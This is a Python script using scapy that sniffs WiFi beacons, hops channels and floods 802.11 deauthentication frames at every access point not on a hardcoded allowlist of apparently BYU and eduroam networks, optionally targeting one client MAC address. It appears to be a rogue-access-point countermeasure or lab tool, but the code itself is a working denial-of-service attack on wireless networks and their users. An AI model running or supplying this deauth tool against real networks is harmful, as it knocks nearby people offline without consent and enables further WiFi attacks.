import os
import argparse, textwrap
import multiprocessing as mp
import logging
from scapy.all import *
import signal
import threading


def perform_deauth(bssid, client, count,essid,interface):
    pckt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    cli_to_ap_pckt = None
    if client != 'FF:FF:FF:FF:FF:FF': 
        cli_to_ap_pckt = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
    while count != 0:
        try:
            for i in range(64):
            # Send out deauth from the AP
                if client != 'FF:FF:FF:FF:FF:FF': 
                    print("Sending deauth to client {}".format(client))
                    sendp(cli_to_ap_pckt,iface=interface)
                else:
                    print("Sending deauth to BSID-{} ESID-{} for all clients...".format(bssid,essid))
                    sendp(pckt,iface=interface)

            count -= 1
        except KeyboardInterrupt:
            break

def add_network(pkt,known_networks,malicious_aps_queue,badAparray):
    essid = pkt[Dot11Elt].info if b'\x00' not in pkt[Dot11Elt].info and pkt[Dot11Elt].info != b'' else b'Hidden SSID'
    bssid = pkt[Dot11].addr3
    channel = int(ord(pkt[Dot11Elt:3].info))
    if bssid not in known_networks:
        bad = (essid,channel),bssid
        malicious_aps_queue.put(bad)
        if bad not in badAparray:
            print("{0:5}\t{1:30}\t{2:30}".format(channel, essid.decode('utf-8'), bssid))
            badAparray.append(bad)


def channel_hopper(interface,aps_to_deauth,client_to_deauth,attack):
    bad_aps = []
    while True:
        try:
            channel = random.randrange(1,13)
            if attack == 1:
                for badAp in bad_aps:
                    if int(badAp[0][1]) == channel:
                        perform_deauth(badAp[1],client_to_deauth,1,badAp[0][0],interface)

                if not aps_to_deauth.empty():
                    badAP_ = aps_to_deauth.get()
                    bad_aps.append(badAP_)
                    perform_deauth(badAP_[1],client_to_deauth,1,badAP_[0][0],interface)
            os.system("iwconfig %s channel %d" % (interface, channel))
            time.sleep(1)
        except KeyboardInterrupt:
            break

def stop_channel_hop(signal, frame):
    global stop_sniff
    stop_sniff = True
    channel_hop.terminate()
    channel_hop.join()
    

def keep_sniffing(pckt):
    return stop_sniff

if __name__ == "__main__":
    queue = mp.Queue()
    parser = argparse.ArgumentParser(description='scapy_sniff.py -Using Scapy python module to have wifi fun time',formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-i', '--interface', dest='interface', type=str, required=True, help="Interface to use for wifi fun time\n"
        "Type iwconfig to see interfaces")
    parser.add_argument('-ca','--cilent addr',dest='client_address',type=str,required=False,help="Client MAC address to Deauth")
    parser.add_argument('-atk','--attack',dest='attack',type=int,required=True,help="Perform deauth attack")
    args = parser.parse_args()
    networks = {'70:3a:0e:90:dd:00':('eduroam',1),'70:3a:0e:90:dd:01':("BYU-WiFi",1),'70:3a:0e:8e:ff:61':("BYU-WiFi",11),'02:2f:df:30:4d:30':('HPCP1525-8ac0a9',6),'1c:f2:9a:99:fe:e6':('runit',6),'b4:f7:a1:c0:ef:2c':('Pixel_9943',6) ,'70:3a:0e:8e:fe:81':('BYU-WiFi',6),'70:3a:0e:8e:fe:80':('eduroam',6),'70:3a:0e:8e:ff:60':('eduroam',11),"b0:2a:43:fc:a7:b0":('JPR',1),"00:30:44:27:9a:7e":('cp11-2.4Ghz',6),"06:41:69:01:ea:cd":('GP26964087',1),"a8:bd:27:30:26:81":('BYU-WiFi',11),"a8:bd:27:30:26:80":('eduroam',11),"f2:b2:3e:bc:85:e6":('gr_wifi',11),"e6:a4:71:a8:9a:8f":('DIRECT-QADESKTOP-79C2M1OmsKP',1),"00:30:44:26:2d:ee":('CP3',6),'a8:bd:27:4d:f0:41': ('BYU-WiFi', 6), 'a8:bd:27:4d:f0:40': ('eduroam', 6), 'a8:bd:27:30:2c:a0': ('eduroam', 1), 'a8:bd:27:30:2c:a1': ('BYU-WiFi', 1), 'a8:bd:27:50:32:01': ('BYU-WiFi', 11), '70:3a:0e:8e:c8:21': ('BYU-WiFi', 1), '70:3a:0e:8e:c8:20': ('eduroam', 1), 'a8:bd:27:50:32:00': ('eduroam', 11), 'a8:bd:27:50:31:c1': ('BYU-WiFi', 11), 'a8:bd:27:50:31:c0': ('eduroam', 11), 'a8:bd:27:30:49:21': ('BYU-WiFi', 11), 'a8:bd:27:30:49:20': ('eduroam', 11), 'a8:bd:27:4d:f2:01': ('BYU-WiFi', 11), 'a8:bd:27:4d:f2:00': ('eduroam', 11), 'e6:a4:71:a8:9a:8f': ('DIRECT-QADESKTOP-79C2M1OmsKP', 1), 'a8:bd:27:50:32:21': ('BYU-WiFi', 6), 'a8:bd:27:50:32:20': ('eduroam', 6), '78:d2:94:0f:ec:fc': ('NET Lab', 6), '70:3a:0e:8e:fe:21': ('BYU-WiFi', 6), '70:3a:0e:8e:fe:20': ('eduroam', 6), '70:3a:0e:8e:f8:e1': ('BYU-WiFi', 1), '70:3a:0e:8e:f8:e0': ('eduroam', 1), '70:3a:0e:8e:b9:e0': ('eduroam', 6), '70:3a:0e:8e:b9:e1': ('BYU-WiFi', 6)}
    mal_aps = []
    stop_sniff = False
    print('Press CTRL+c to stop sniffing..')
    print('='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100)
    if args.client_address is None:
        client_addr = "FF:FF:FF:FF:FF:FF"
    else:
        client_addr = args.client_address
    channel_hop = mp.Process(target = channel_hopper, args=(args.interface,queue,client_addr,args.attack,))
    channel_hop.start()
    signal.signal(signal.SIGINT, stop_channel_hop)
    sniff(iface=args.interface, lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=keep_sniffing, prn=lambda x: add_network(x,networks,queue,mal_aps,))


             
  	                 